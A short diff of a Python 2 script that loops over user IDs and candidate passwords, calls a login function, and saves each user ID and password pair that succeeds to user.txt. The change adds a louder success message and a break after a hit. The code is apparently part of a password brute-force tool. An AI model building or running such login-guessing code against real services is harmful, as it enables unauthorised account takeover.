@@ -64,11 +64,12 @@ for o in userid:
          print l+" "+str(o)
          if sendLoginRequest(o, l) == True:
             #urllib.urlopen("http://google.com")
-            print 'success!!! and '+l+' - password, userid -'+str(o)
+            print '----------#######---------success!!! and '+l+' - password, userid -'+str(o)
             trst[o]=l
             sendLogoutRequest(str(o))
             with open("user.txt","a") as myfile:
                 myfile.write(str(o)+" "+str(l)+'\n')
+            break
             
          
 
